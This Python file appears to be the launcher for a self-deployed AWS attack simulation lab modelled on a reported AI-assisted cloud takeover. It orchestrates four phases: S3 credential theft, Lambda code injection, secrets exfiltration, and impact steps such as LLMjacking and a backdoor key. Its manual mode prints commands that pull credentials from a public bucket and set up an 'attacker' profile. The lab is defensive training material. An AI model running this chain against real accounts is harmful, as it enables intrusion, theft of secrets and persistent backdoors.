#!/usr/bin/env python3
"""
main.py -- The 8-Minute Takeover: Attack Launcher

Modes:
  python main.py              Interactive menu
  python main.py --auto       Full automated attack chain
  python main.py --manual     Deploy infra + print manual commands
  python main.py status       Show lab environment status
  python main.py report       Generate report from last log file

Flags:
  --log            Write structured log to logs/ directory
  --report         Generate Markdown report after attack completes
  --skip-deploy    Skip Terraform deployment (infra already up)
  --skip-cleanup   Leave infrastructure running after attack
"""
import argparse
import json
import os
import subprocess
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, IntPrompt
from rich import box

from config import AttackConfig
from utils import (
    console,
    format_table,
    init_logging,
    close_logging,
    log_event,
    print_error,
    print_info,
    print_phase_banner,
    print_success,
    print_warning,
)

# =============================================================================
# Constants
# =============================================================================

BANNER = r"""
[bright_red]  _____ _            ___        __  __ _             _         _____     _
 |_   _| |__   ___  ( _ )      |  \/  (_)_ __  _   _| |_ ___  |_   _|_ _| | _____  _____  ___ _ __
   | | | '_ \ / _ \ / _ \/\    | |\/| | | '_ \| | | | __/ _ \   | |/ _` | |/ / _ \/ _ \ \ / / _ \ '__|
   | | | | | |  __/| (_>  <    | |  | | | | | | |_| | ||  __/   | | (_| |   <  __/ (_) \ V /  __/ |
   |_| |_| |_|\___| \___/\/    |_|  |_|_|_| |_|\__,_|\__\___|   |_|\__,_|_|\_\___|\___/ \_/ \___|_|
[/bright_red]
[dim]Based on a real attack observed by Sysdig TRT, November 28, 2025[/dim]
[dim]AI-assisted attacker: stolen S3 credentials -> full admin in 8 minutes[/dim]
"""

TERRAFORM_DIR = str(Path(__file__).parent.parent / "terraform")


# =============================================================================
# Terraform Helpers
# =============================================================================

def terraform_is_deployed() -> bool:
    """Check if Terraform state exists with resources."""
    tfstate = Path(TERRAFORM_DIR) / "terraform.tfstate"
    if not tfstate.exists():
        return False
    try:
        with open(tfstate) as f:
            state = json.load(f)
        return len(state.get("resources", [])) > 0
    except (json.JSONDecodeError, IOError):
        return False


def run_terraform_deploy() -> bool:
    """Run terraform init + apply, showing output live."""
    print_info("Deploying infrastructure with Terraform...")

    try:
        subprocess.run(["terraform", "version"], capture_output=True, check=True)
    except (FileNotFoundError, subprocess.CalledProcessError):
        print_error("Terraform not found. Install Terraform >= 1.10.0 first.")
        return False

    print_info("Running terraform init...")
    result = subprocess.run(
        ["terraform", "init", "-input=false"],
        cwd=TERRAFORM_DIR,
    )
    if result.returncode != 0:
        print_error("terraform init failed (see output above)")
        return False

    print_info("Running terraform apply (this takes 1-2 minutes)...")
    result = subprocess.run(
        ["terraform", "apply", "-auto-approve", "-input=false"],
        cwd=TERRAFORM_DIR,
    )
    if result.returncode != 0:
        print_error("terraform apply failed (see output above)")
        return False

    print_success("Infrastructure deployed successfully")
    return True


# =============================================================================
# Interactive Mode
# =============================================================================

def run_interactive(config: AttackConfig) -> dict:
    """Run in interactive menu mode. Returns combined results."""
    import exploit
    import escalate
    import exfiltrate
    import impact
    import status as status_mod

    all_results = {}

    while True:
        console.print()
        console.print(
            Panel(
                "[bright_white]Attack Phases[/bright_white]\n\n"
                "  [bright_cyan]1[/bright_cyan]  Phase 1: Initial Access "
                "(S3 discovery, credential theft, recon)\n"
                "  [bright_red]2[/bright_red]  Phase 2: Privilege Escalation "
                "(Lambda code injection)\n"
                "  [bright_yellow]3[/bright_yellow]  Phase 3: Data Exfiltration "
                "(Secrets Manager + SSM)\n"
                "  [bright_magenta]4[/bright_magenta]  Phase 4: Impact & Persistence "
                "(LLMjacking, GPU, backdoor)\n\n"
                "  [bright_green]5[/bright_green]  Run ALL phases sequentially\n"
                "  [dim]6[/dim]  View current config\n"
                "  [dim]7[/dim]  Lab status\n"
                "  [dim]0[/dim]  Exit",
                title="[bold]The 8-Minute Takeover[/bold]",
                border_style="bright_white",
                box=box.ROUNDED,
            )
        )

        try:
            choice = IntPrompt.ask(
                "\n  Select an option",
                choices=["0", "1", "2", "3", "4", "5", "6", "7"],
                default=5,
            )
        except KeyboardInterrupt:
            console.print("\n  Exiting.")
            break

        try:
            if choice == 0:
                break
            elif choice == 1:
                all_results["phase1"] = exploit.run_phase(config)
            elif choice == 2:
                all_results["phase2"] = escalate.run_phase(config)
            elif choice == 3:
                all_results["phase3"] = exfiltrate.run_phase(config)
            elif choice == 4:
                all_results["phase4"] = impact.run_phase(config)
            elif choice == 5:
                all_results = run_all_phases(config)
            elif choice == 6:
                config.print_config_summary()
            elif choice == 7:
                status_mod.run_status()
        except RuntimeError as exc:
            print_error(str(exc))
        except Exception as exc:
            print_error(f"Unexpected error: {exc}")
            console.print("[dim]  Returning to menu...[/dim]")

    return all_results


# =============================================================================
# Automated Mode
# =============================================================================

def run_all_phases(config: AttackConfig) -> dict:
    """Run all attack phases sequentially."""
    import exploit
    import escalate
    import exfiltrate
    import impact

    console.print(
        Panel(
            "[bold bright_red]FULL ATTACK CHAIN[/bold bright_red]\n"
            "[dim]Running all 4 phases sequentially...[/dim]",
            border_style="bright_red",
            box=box.DOUBLE,
        )
    )

    all_results = {}
    all_results["phase1"] = exploit.run_phase(config)
    all_results["phase2"] = escalate.run_phase(config)

    if config.admin_session is not None:
        all_results["phase3"] = exfiltrate.run_phase(config)
    else:
        print_error("Skipping Phase 3: admin credentials not obtained")

    if config.admin_session is not None:
        all_results["phase4"] = impact.run_phase(config)
    else:
        print_error("Skipping Phase 4: admin credentials not obtained")

    print_attack_summary(config, all_results)
    return all_results


def print_attack_summary(config: AttackConfig, results: dict) -> None:
    """Print a summary table of the full attack."""
    console.print()
    console.print(
        Panel(
            "[bold bright_green]ATTACK COMPLETE[/bold bright_green]",
            border_style="bright_green",
            box=box.DOUBLE,
            expand=True,
        )
    )

    rows = []

    p1 = results.get("phase1", {})
    identity = p1.get("identity", {})
    rows.append(["Phase 1", "Initial Access", identity.get("Arn", "N/A")])

    p2 = results.get("phase2", {})
    harvest = p2.get("harvest", {})
    admin_creds = harvest.get("admin_credentials", {})
    admin_key = admin_creds.get("AccessKeyId", "N/A")
    rows.append([
        "Phase 2", "Privilege Escalation",
        f"Admin key: {admin_key[:12]}..." if admin_key != "N/A" else "FAILED",
    ])

    p3 = results.get("phase3", {})
    sm_count = len(p3.get("secrets", []))
    ssm_count = len(p3.get("parameters", []))
    rows.append([
        "Phase 3", "Data Exfiltration",
        f"{sm_count} secrets + {ssm_count} parameters harvested",
    ])

    p4 = results.get("phase4", {})
    gpu_result = p4.get("gpu_recon", {}).get("dry_run", "N/A")
    backdoor = p4.get("backdoor", {}).get("access_key", {})
    backdoor_key = backdoor.get("AccessKeyId", "N/A")
    rows.append([
        "Phase 4", "Impact & Persistence",
        f"GPU: {gpu_result}, Backdoor: {backdoor_key[:12]}..."
        if backdoor_key != "N/A" else f"GPU: {gpu_result}",
    ])

    table = format_table(
        "Attack Summary",
        ["Phase", "Name", "Result"],
        rows,
        ["bright_cyan", "bright_white", "bright_green"],
    )
    console.print(table)


# =============================================================================
# Manual Mode
# =============================================================================

def run_manual(config: AttackConfig) -> None:
    """Print configuration and commands for manual execution."""
    console.print(
        Panel(
            "[bold bright_yellow]MANUAL MODE[/bold bright_yellow]\n"
            "[dim]Infrastructure is deployed. Follow the commands below "
            "or see docs/attack_guide.md for the full walkthrough.[/dim]",
            border_style="bright_yellow",
            box=box.DOUBLE,
        )
    )

    config.print_config_summary()

    console.print()
    console.print("[bold]Quick Start Commands:[/bold]")
    console.print()
    console.print(f"  [bright_cyan]# Step 1: List the public bucket[/bright_cyan]")
    console.print(f"  aws s3 ls s3://{config.bucket_name}/ --no-sign-request --recursive")
    console.print()
    console.print(f"  [bright_cyan]# Step 2: Download credentials[/bright_cyan]")
    console.print(f"  aws s3 cp s3://{config.bucket_name}/config/pipeline-config.env - --no-sign-request")
    console.print()
    console.print(f"  [bright_cyan]# Step 3: Configure attacker profile[/bright_cyan]")
    console.print('  aws configure set aws_access_key_id "<KEY>" --profile attacker')
    console.print('  aws configure set aws_secret_access_key "<SECRET>" --profile attacker')
    console.print(f'  aws configure set region "{config.aws_region}" --profile attacker')
    console.print()
    console.print(f"  [bright_cyan]# Step 4: Verify identity[/bright_cyan]")
    console.print("  aws sts get-caller-identity --profile attacker")
    console.print()
    console.print("[dim]Full walkthrough: docs/attack_guide.md[/dim]")


# =============================================================================
# Main Entry Point
# =============================================================================

def main() -> None:
    parser = argparse.ArgumentParser(
        description="The 8-Minute Takeover: Cloud Attack Simulation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Commands:\n"
            "  status          Show lab environment status\n"
            "  report [LOG]    Generate report from last log file (or specify path)\n"
            "\n"
            "Examples:\n"
            "  python main.py                  # Interactive menu\n"
            "  python main.py --auto           # Full automated attack\n"
            "  python main.py --auto --log     # Attack with logging\n"
            "  python main.py --auto --report  # Attack + generate report\n"
            "  python main.py status           # Check lab state\n"
            "  python main.py report           # Report from last log\n"
        ),
    )
    parser.add_argument(
        "command",
        nargs="?",
        default=None,
        help="Subcommand: status, report",
    )
    parser.add_argument("--auto", action="store_true", help="Run all phases automatically")
    parser.add_argument("--manual", action="store_true", help="Print manual execution commands")
    parser.add_argument("--log", action="store_true", help="Write structured log to logs/ directory")
    parser.add_argument("--report", action="store_true", help="Generate Markdown report after attack")
    parser.add_argument("--skip-deploy", action="store_true", help="Skip Terraform deployment")
    parser.add_argument("--skip-cleanup", action="store_true", help="Leave infrastructure running")

    args = parser.parse_args()

    # --- Handle subcommands that don't need infra ---

    if args.command == "status":
        import status as status_mod
        console.print(BANNER)
        status_mod.run_status()
        return

    if args.command == "report":
        import report as report_mod
        # Find the latest log file
        log_dir = Path(__file__).parent.parent / "logs"
        logs = sorted(log_dir.glob("*.jsonl"), reverse=True) if log_dir.exists() else []
        if not logs:
            print_error("No log files found. Run an attack with --log first.")
            sys.exit(1)
        log_path = str(logs[0])
        print_info(f"Generating report from: {log_path}")
        report_path = report_mod.generate_report_from_log(log_path)
        if report_path:
            print_success(f"Report written to: {report_path}")
        return

    # --- Main attack flow ---

    console.print(BANNER)

    # Init logging if requested
    log_path = None
    if args.log or args.report:
        log_path = init_logging()
        print_success(f"Logging to: {log_path}")

    # Deploy infrastructure if needed
    if not args.skip_deploy:
        if terraform_is_deployed():
            print_success("Infrastructure already deployed (terraform.tfstate found)")
        else:
            tfvars = Path(TERRAFORM_DIR) / "terraform.tfvars"
            if not tfvars.exists():
                example = Path(TERRAFORM_DIR) / "terraform.tfvars.example"
                if example.exists():
                    print_warning("terraform.tfvars not found. Copying from example...")
                    import shutil
                    shutil.copy2(str(example), str(tfvars))
                else:
                    print_error("No terraform.tfvars or terraform.tfvars.example found.")
                    sys.exit(1)
            if not run_terraform_deploy():
                print_error("Infrastructure deployment failed. Exiting.")
                sys.exit(1)
    else:
        print_info("Skipping Terraform deployment (--skip-deploy)")

    # Load configuration
    try:
        config = AttackConfig(terraform_dir=TERRAFORM_DIR)
    except SystemExit:
        print_error("Failed to load config. Is infrastructure deployed? Run ./setup.sh")
        sys.exit(1)

    # Route to mode
    all_results = {}
    try:
        if args.manual:
            run_manual(config)
        elif args.auto:
            all_results = run_all_phases(config)
        else:
            all_results = run_interactive(config)
    except KeyboardInterrupt:
        console.print("\n\n  [dim]Attack interrupted by user.[/dim]")
    except Exception as exc:
        print_error(f"Unexpected error: {exc}")
        raise
    finally:
        close_logging()

    # Generate report if requested
    if args.report and all_results:
        import report as report_mod
        report_path = report_mod.generate_report(all_results, config=config, log_file=log_path)
        print_success(f"Report written to: {report_path}")

    # Cleanup reminder
    if not args.skip_cleanup and not args.manual:
        console.print()
        print_warning(
            "Remember to clean up! Run: ./cleanup.sh "
            "or: cd terraform && terraform destroy"
        )


if __name__ == "__main__":
    main()
